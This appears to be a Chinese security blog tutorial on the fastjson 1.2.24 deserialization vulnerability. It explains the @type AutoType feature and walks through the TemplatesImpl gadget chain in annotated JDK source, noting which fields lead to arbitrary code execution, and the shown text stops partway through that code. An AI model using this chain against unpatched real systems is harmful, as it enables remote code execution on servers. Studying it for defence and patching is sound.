<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="声明
本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。
Fastjson 是什么

fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。

fastjson相对其他JSON库的特点是快。fastjson在阿里巴巴大规模使用，在数万台服务器上部署，fastjson在业界被广泛接受。在2012年被开源中国评选为最受欢迎的国产开源软件之一。
以上摘自Fastjson GitHub 介绍。
但近年来随着 Fastjson 不断爆出漏洞，各大中小型公司都逐渐弃用 Fastjson ，甚至阿里自己开源的服务注册、配置管理平台 NACOS 在 1.3.0 版本之后都从 Fastjson 替换为了 Jackson (详见 https://github.com/alibaba/nacos/releases/tag/1.3.0) ，可见漏洞危害之大。
为什么会弃用 Fastjson ？
想要研究一个产品的漏洞其中有一条很好的途径就是去查询 CVE 编号，但是我在检索之后发现 Fastjson 只有 CVE-2017-18349 这一条，而 Jackson 竟然有高达 76 条。
这能否证明 Fastjson 比 Jackson 更安全呢？答案并不是，都是半斤八两，有些 Fastjson 里面出现的漏洞在 Jackson 里面也同样存在。
那为什么会有公司弃用 Fastjson 呢？
或许是 Jackson 有更完善且公开的漏洞管理机制，或许是国外的月亮比较圆，或许是随大流，也或许是 Fastjson 代码质量不过关（知乎上有很多回答批判 Fastjson 代码糟糕的），真实原因就不得而知了。
尽管近年来有公司不断弃用 Fastjson ，但还有很多公司在使用，并且已经开发上线的系统想要替换或者升级 Fastjson 还需要时间，因此我们很有必要学习一下 Fastjson 漏洞的产因。
Fastjson 漏洞产生原因
Fastjson 第一次被爆出有漏洞是官方在2017年3月15日主动披露的，详见 https://github.com/alibaba/fastjson/wiki/security_update_20170315 。漏洞影响 1.2.24 以及之前的版本。我们今天来研究一下当 fastjson version <= 1.2.24 时漏洞是如何产生的。"><title>Java 反序列化漏洞原理（三）fastjson 1.2.24 Templateslmpl 利用原理</title><link rel="shortcut icon" type=image/x-icon href=/><link rel=stylesheet href=/css/main.0568d3f70e9896300444ff10565468b82c2dace6b1b82bc72fba6ae51bfb0849887e0eb4ccb3cdb1c915fbe68c7000fbea631be9322fd5d0bcab56732ce7293f.css integrity="sha512-BWjT9w6YljAERP8QVlRouCwtrOaxuCvHL7pq5Rv7CEmIfg60zLPNsckV++aMcAD76mMb6TIv1dC8q1ZzLOcpPw=="></head><body a=auto><main class=page-content aria-label=Content><div class=w><div class=post-meta><a href=/>..</a><p><time datetime="2021-10-21 22:56:00 +0800 +0800">2021-10-21</time></p></div><article><h1>Java 反序列化漏洞原理（三）fastjson 1.2.24 Templateslmpl 利用原理</h1><h2 id=声明>声明</h2><p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。</p><h2 id=fastjson-是什么>Fastjson 是什么</h2><blockquote><p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p></blockquote><blockquote><p>fastjson相对其他JSON库的特点是快。fastjson在阿里巴巴大规模使用，在数万台服务器上部署，fastjson在业界被广泛接受。在2012年被开源中国评选为最受欢迎的国产开源软件之一。</p></blockquote><p>以上摘自Fastjson GitHub 介绍。</p><p>但近年来随着 Fastjson 不断爆出漏洞，各大中小型公司都逐渐弃用 Fastjson ，甚至阿里自己开源的服务注册、配置管理平台 <strong>NACOS</strong> 在 1.3.0 版本之后都从 Fastjson 替换为了 Jackson (详见 <a href=https://github.com/alibaba/nacos/releases/tag/1.3.0>https://github.com/alibaba/nacos/releases/tag/1.3.0</a>) ，可见漏洞危害之大。</p><h2 id=为什么会弃用-fastjson->为什么会弃用 Fastjson ？</h2><p>想要研究一个产品的漏洞其中有一条很好的途径就是去查询 CVE 编号，但是我在检索之后发现 Fastjson 只有 <strong>CVE-2017-18349</strong> 这一条，而 Jackson 竟然有高达 76 条。</p><p>这能否证明 Fastjson 比 Jackson 更安全呢？答案并不是，都是半斤八两，有些 Fastjson 里面出现的漏洞在 Jackson 里面也同样存在。</p><p>那为什么会有公司弃用 Fastjson 呢？</p><p>或许是 Jackson 有更完善且公开的漏洞管理机制，或许是国外的月亮比较圆，或许是随大流，也或许是 Fastjson 代码质量不过关（知乎上有很多回答批判 Fastjson 代码糟糕的），真实原因就不得而知了。</p><p>尽管近年来有公司不断弃用 Fastjson ，但还有很多公司在使用，并且已经开发上线的系统想要替换或者升级 Fastjson 还需要时间，因此我们很有必要学习一下 Fastjson 漏洞的产因。</p><h2 id=fastjson-漏洞产生原因>Fastjson 漏洞产生原因</h2><p>Fastjson 第一次被爆出有漏洞是官方在2017年3月15日主动披露的，详见 <a href=https://github.com/alibaba/fastjson/wiki/security_update_20170315>https://github.com/alibaba/fastjson/wiki/security_update_20170315</a> 。漏洞影响 1.2.24 以及之前的版本。我们今天来研究一下当 fastjson version &lt;= 1.2.24 时漏洞是如何产生的。</p><p>我们先在 pom.xml 中增加 fastjson 1.2.24 的依赖。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#ff79c6>&lt;dependency&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;groupId&gt;</span>com.alibaba<span style=color:#ff79c6>&lt;/groupId&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;artifactId&gt;</span>fastjson<span style=color:#ff79c6>&lt;/artifactId&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;version&gt;</span>1.2.24<span style=color:#ff79c6>&lt;/version&gt;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>&lt;/dependency&gt;</span>
</span></span></code></pre></div><p>下面先看一个最常见的序列化为JSON和反序列化为对象的过程。</p><p>首先定义一个常见的 Java 对象。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>User</span> {
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>private</span> String name;
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>private</span> Integer age;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> String <span style=color:#50fa7b>getName</span>() {
</span></span><span style=display:flex><span>        System.<span style=color:#50fa7b>out</span>.<span style=color:#50fa7b>println</span>(<span style=color:#f1fa8c>&#34;call getName&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> name;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>setName</span>(String name) {
</span></span><span style=display:flex><span>        System.<span style=color:#50fa7b>out</span>.<span style=color:#50fa7b>println</span>(<span style=color:#f1fa8c>&#34;call setName&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>this</span>.<span style=color:#50fa7b>name</span> <span style=color:#ff79c6>=</span> name;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> Integer <span style=color:#50fa7b>getAge</span>() {
</span></span><span style=display:flex><span>        System.<span style=color:#50fa7b>out</span>.<span style=color:#50fa7b>println</span>(<span style=color:#f1fa8c>&#34;call getAge&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> age;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>setAge</span>(Integer age) {
</span></span><span style=display:flex><span>        System.<span style=color:#50fa7b>out</span>.<span style=color:#50fa7b>println</span>(<span style=color:#f1fa8c>&#34;call setAge&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>this</span>.<span style=color:#50fa7b>age</span> <span style=color:#ff79c6>=</span> age;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    @Override
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> String <span style=color:#50fa7b>toString</span>() {
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#34;User{&#34;</span> <span style=color:#ff79c6>+</span>
</span></span><span style=display:flex><span>                <span style=color:#f1fa8c>&#34;name=&#39;&#34;</span> <span style=color:#ff79c6>+</span> name <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#39;\&#39;&#39;</span> <span style=color:#ff79c6>+</span>
</span></span><span style=display:flex><span>                <span style=color:#f1fa8c>&#34;, age=&#34;</span> <span style=color:#ff79c6>+</span> age <span style=color:#ff79c6>+</span>
</span></span><span style=display:flex><span>                <span style=color:#f1fa8c>&#39;}&#39;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>编写一个测试类</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#ff79c6>import</span> com.alibaba.fastjson.JSON;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>Eval0</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>main</span>(String<span style=color:#ff79c6>[]</span> args) {
</span></span><span style=display:flex><span>        User user <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> User();
</span></span><span style=display:flex><span>        user.<span style=color:#50fa7b>setName</span>(<span style=color:#f1fa8c>&#34;守法市民小杜&#34;</span>);
</span></span><span style=display:flex><span>        user.<span style=color:#50fa7b>setAge</span>(26);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        String jsonString <span style=color:#ff79c6>=</span> JSON.<span style=color:#50fa7b>toJSONString</span>(user);
</span></span><span style=display:flex><span>        System.<span style=color:#50fa7b>out</span>.<span style=color:#50fa7b>println</span>(<span style=color:#f1fa8c>&#34;序列化后: &#34;</span> <span style=color:#ff79c6>+</span> jsonString);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        System.<span style=color:#50fa7b>out</span>.<span style=color:#50fa7b>println</span>(<span style=color:#f1fa8c>&#34;反序列化开始&#34;</span>);
</span></span><span style=display:flex><span>        System.<span style=color:#50fa7b>out</span>.<span style=color:#50fa7b>println</span>(<span style=color:#f1fa8c>&#34;反序列化: &#34;</span> <span style=color:#ff79c6>+</span> JSON.<span style=color:#50fa7b>parseObject</span>(jsonString, User.<span style=color:#50fa7b>class</span>));
</span></span><span style=display:flex><span>        System.<span style=color:#50fa7b>out</span>.<span style=color:#50fa7b>println</span>(<span style=color:#f1fa8c>&#34;反序列化结束&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>代码很简单，运行后会输出：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>call setName
</span></span><span style=display:flex><span>call setAge
</span></span><span style=display:flex><span>call getAge
</span></span><span style=display:flex><span>call getName
</span></span><span style=display:flex><span>序列化后: <span style=color:#ff79c6>{</span><span style=color:#f1fa8c>&#34;age&#34;</span>:26,<span style=color:#f1fa8c>&#34;name&#34;</span>:<span style=color:#f1fa8c>&#34;守法市民小杜&#34;</span><span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>反序列化开始
</span></span><span style=display:flex><span>call setAge
</span></span><span style=display:flex><span>call setName
</span></span><span style=display:flex><span>反序列化: User<span style=color:#ff79c6>{</span><span style=color:#8be9fd;font-style:italic>name</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;守法市民小杜&#39;</span>, <span style=color:#8be9fd;font-style:italic>age</span><span style=color:#ff79c6>=</span>26<span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>反序列化结束
</span></span></code></pre></div><p>可以看到 Fastjson 在将JSON字符串反序列化为 Java 对象的时候调用了 set方法，看过《Java 反序列化漏洞原理》前两篇文章的同学可能会思考，我们能否构建一条利用链，让 Fastjson 在执行 set 方法的时候能够执行我们指定的命令。</p><p>我们先假设这个方式成立，但目前存在两个问题：</p><ol><li>如何让 Fastjson 将JSON字符串反序列化为我们指定的对象？</li><li>哪一个对象可以在 set 的时候执行我们指定的命令呢？</li></ol><p>第一个问题查看 Fastjson 文档后可以得到答案，当 JSON 字符串的第一个 <strong>key</strong> 为 <strong>@type</strong> 时，会将 JSON 字符串反序列化为 <strong>@type</strong> 对应 <strong>value</strong> 中指定的 Java 类，这就是 Fastjson 的 AutoType 功能。并且 Fastjson 在反序列化带有 <strong>@type</strong> 的 JSON 字符串时，如果没有指定Java对象的类型，还会调用其成员变量的 get 方法。</p><p>我们稍微改动一下测试类，在序列化为JSON时将类型也写进去，在反序列化时将类型去除：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#ff79c6>import</span> com.alibaba.fastjson.JSON;
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> com.alibaba.fastjson.serializer.SerializerFeature;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>Eval1</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>main</span>(String<span style=color:#ff79c6>[]</span> args) {
</span></span><span style=display:flex><span>        User user <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> User();
</span></span><span style=display:flex><span>        user.<span style=color:#50fa7b>setName</span>(<span style=color:#f1fa8c>&#34;守法市民小杜&#34;</span>);
</span></span><span style=display:flex><span>        user.<span style=color:#50fa7b>setAge</span>(26);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        String jsonString <span style=color:#ff79c6>=</span> JSON.<span style=color:#50fa7b>toJSONString</span>(user, SerializerFeature.<span style=color:#50fa7b>WriteClassName</span>);
</span></span><span style=display:flex><span>        System.<span style=color:#50fa7b>out</span>.<span style=color:#50fa7b>println</span>(<span style=color:#f1fa8c>&#34;序列化后: &#34;</span> <span style=color:#ff79c6>+</span> jsonString);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        System.<span style=color:#50fa7b>out</span>.<span style=color:#50fa7b>println</span>(<span style=color:#f1fa8c>&#34;反序列化开始&#34;</span>);
</span></span><span style=display:flex><span>        System.<span style=color:#50fa7b>out</span>.<span style=color:#50fa7b>println</span>(<span style=color:#f1fa8c>&#34;反序列化: &#34;</span> <span style=color:#ff79c6>+</span> JSON.<span style=color:#50fa7b>parseObject</span>(jsonString));
</span></span><span style=display:flex><span>        System.<span style=color:#50fa7b>out</span>.<span style=color:#50fa7b>println</span>(<span style=color:#f1fa8c>&#34;反序列化结束&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>执行后会输出：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>call setName
</span></span><span style=display:flex><span>call setAge
</span></span><span style=display:flex><span>call getAge
</span></span><span style=display:flex><span>call getName
</span></span><span style=display:flex><span>序列化后: <span style=color:#ff79c6>{</span><span style=color:#f1fa8c>&#34;@type&#34;</span>:<span style=color:#f1fa8c>&#34;cn.typesafe.jsv.fastjson.User&#34;</span>,<span style=color:#f1fa8c>&#34;age&#34;</span>:26,<span style=color:#f1fa8c>&#34;name&#34;</span>:<span style=color:#f1fa8c>&#34;守法市民小杜&#34;</span><span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>反序列化开始
</span></span><span style=display:flex><span>call setAge
</span></span><span style=display:flex><span>call setName
</span></span><span style=display:flex><span>call getAge
</span></span><span style=display:flex><span>call getName
</span></span><span style=display:flex><span>反序列化: <span style=color:#ff79c6>{</span><span style=color:#f1fa8c>&#34;name&#34;</span>:<span style=color:#f1fa8c>&#34;守法市民小杜&#34;</span>,<span style=color:#f1fa8c>&#34;age&#34;</span>:26<span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>反序列化结束
</span></span></code></pre></div><p>可以看到确实是调用了 Java 对象的 get 方法，所以如果 get 方法能够触发代码执行也是可以的。</p><h2 id=templatesimpl-的利用链>TemplatesImpl 的利用链</h2><p>扩大条件后，第二个问题研究安全的前辈也已经帮我们找到了一个合适的 Java 对象 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>。</p><p>它的成员变量如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>final</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>TemplatesImpl</span> <span style=color:#8be9fd;font-style:italic>implements</span> Templates, Serializable {
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd;font-style:italic>final</span> <span style=color:#8be9fd>long</span> serialVersionUID <span style=color:#ff79c6>=</span> 673094361519270707L;
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>final</span> <span style=color:#8be9fd;font-style:italic>static</span> String DESERIALIZE_TRANSLET <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;jdk.xml.enableTemplatesImplDeserialization&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#6272a4>// 父抽象类的完整包名称</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>private</span> <span style=color:#8be9fd;font-style:italic>static</span> String ABSTRACT_TRANSLET
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#6272a4>// 不重要，只要不为空就行</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>private</span> String _name <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>null</span>;
</span></span><span style=display:flex><span>    <span style=color:#6272a4>// 存放字节数组的数组</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>private</span> <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[][]</span> _bytecodes <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>null</span>;
</span></span><span style=display:flex><span>    <span style=color:#6272a4>// Class 数组</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>private</span> Class<span style=color:#ff79c6>[]</span> _class <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>null</span>;
</span></span><span style=display:flex><span>    <span style=color:#6272a4>// translet 子类在 _class 中的下标</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>private</span> <span style=color:#8be9fd>int</span> _transletIndex <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>-</span>1;
</span></span><span style=display:flex><span>    <span style=color:#6272a4>// 存放 class 的容器，可以忽略</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>private</span> Hashtable _auxClasses <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>null</span>;
</span></span><span style=display:flex><span>    <span style=color:#6272a4>// 此字段不能为 null，因为要让 Fastjson 调用 getOutputProperties 方法</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>private</span> Properties _outputProperties;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#6272a4>// 其他成员变量可以忽略</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>我们首先就来看 <code>_outputProperties</code> 对应的 <code>getOutputProperties</code> 方法：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>synchronized</span> Properties <span style=color:#50fa7b>getOutputProperties</span>() {
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>try</span> {
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> newTransformer().<span style=color:#50fa7b>getOutputProperties</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>catch</span> (TransformerConfigurationException e) {
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>null</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>代码很简单，重要的是 <code>newTransformer()</code> 方法，代码如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>synchronized</span> Transformer <span style=color:#50fa7b>newTransformer</span>()
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>throws</span> TransformerConfigurationException
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    TransformerImpl transformer;
</span></span><span style=display:flex><span>    transformer <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> TransformerImpl(getTransletInstance(), _outputProperties,
</span></span><span style=display:flex><span>        _indentNumber, _tfactory);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> (_uriResolver <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span>) {
</span></span><span style=display:flex><span>        transformer.<span style=color:#50fa7b>setURIResolver</span>(_uriResolver);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> (_tfactory.<span style=color:#50fa7b>getFeature</span>(XMLConstants.<span style=color:#50fa7b>FEATURE_SECURE_PROCESSING</span>)) {
</span></span><span style=display:flex><span>        transformer.<span style=color:#50fa7b>setSecureProcessing</span>(<span style=color:#ff79c6>true</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> transformer;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>其中 <code>getTransletInstance()</code> 代码如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>private</span> Translet <span style=color:#50fa7b>getTransletInstance</span>()
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>throws</span> TransformerConfigurationException {
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>try</span> {
</span></span><span style=display:flex><span>        <span style=color:#6272a4>// _name 不能为 null，不然就直接返回了</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> (_name <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span>) <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>null</span>;
</span></span><span style=display:flex><span>        <span style=color:#6272a4>// _class 不能赋值，要进入 defineTransletClasses 才能将我们准备的 Class 加载进来</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> (_class <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span>) defineTransletClasses();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#6272a4>// 从加载成功的Class中找到 AbstractTranslet 的子类使用反射创建对象，newInstance() 会调用默认的无参构造方法，因此只要在构造方法中添加我们需要的代码就能做到任意代码执行</span>
</span></span><span style=display:flex><span>        AbstractTranslet translet <span style=color:#ff79c6>=</span> (AbstractTranslet) _class<span style=color:#ff79c6>[</span>_transletIndex<span style=color:#ff79c6>]</span>.<span style=color:#50fa7b>newInstance</span>();
</span></span><span style=display:flex><span>        <span style=color:#6272a4>// 下面的代码不重要了</span>
</span></span><span style=display:flex><span>        translet.<span style=color:#50fa7b>postInitialization</span>();
</span></span><span style=display:flex><span>        translet.<span style=color:#50fa7b>setTemplates</span>(<span style=color:#ff79c6>this</span>);
</span></span><span style=display:flex><span>        translet.<span style=color:#50fa7b>setServicesMechnism</span>(_useServicesMechanism);
</span></span><span style=display:flex><span>        translet.<span style=color:#50fa7b>setAllowedProtocols</span>(_accessExternalStylesheet);
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> (_auxClasses <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span>) {
</span></span><span style=display:flex><span>            translet.<span style=color:#50fa7b>setAuxiliaryClasses</span>(_auxClasses);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> translet;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>catch</span> (InstantiationException e) {
</span></span><span style=display:flex><span>        ErrorMsg err <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ErrorMsg(ErrorMsg.<span style=color:#50fa7b>TRANSLET_OBJECT_ERR</span>, _name);
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> TransformerConfigurationException(err.<span style=color:#50fa7b>toString</span>());
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>catch</span> (IllegalAccessException e) {
</span></span><span style=display:flex><span>        ErrorMsg err <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ErrorMsg(ErrorMsg.<span style=color:#50fa7b>TRANSLET_OBJECT_ERR</span>, _name);
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> TransformerConfigurationException(err.<span style=color:#50fa7b>toString</span>());
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><code>defineTransletClasses()</code> 方法代码如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>private</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>defineTransletClasses</span>()
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>throws</span> TransformerConfigurationException {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#6272a4>// _bytecodes 不能为 null</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> (_bytecodes <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span>) {
</span></span><span style=display:flex><span>        ErrorMsg err <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ErrorMsg(ErrorMsg.<span style=color:#50fa7b>NO_TRANSLET_CLASS_ERR</span>);
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> TransformerConfigurationException(err.<span style=color:#50fa7b>toString</span>());
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#6272a4>// 获取类加载器</span>
</span></span><span style=display:flex><span>    TransletClassLoader loader <span style=color:#ff79c6>=</span> (TransletClassLoader)
</span></span><span style=display:flex><span>        AccessController.<span style=color:#50fa7b>doPrivileged</span>(<span style=color:#ff79c6>new</span> PrivilegedAction() {
</span></span><span style=display:flex><span>            <span style=color:#8be9fd;font-style:italic>public</span> Object <span style=color:#50fa7b>run</span>() {
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>new</span> TransletClassLoader(ObjectFactory.<span style=color:#50fa7b>findClassLoader</span>());
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        });
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>try</span> {
</span></span><span style=display:flex><span>        <span style=color:#6272a4>// 获取二维数组的长度，一个字节数组对应一个 Class </span>
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>final</span> <span style=color:#8be9fd>int</span> classCount <span style=color:#ff79c6>=</span> _bytecodes.<span style=color:#50fa7b>length</span>;
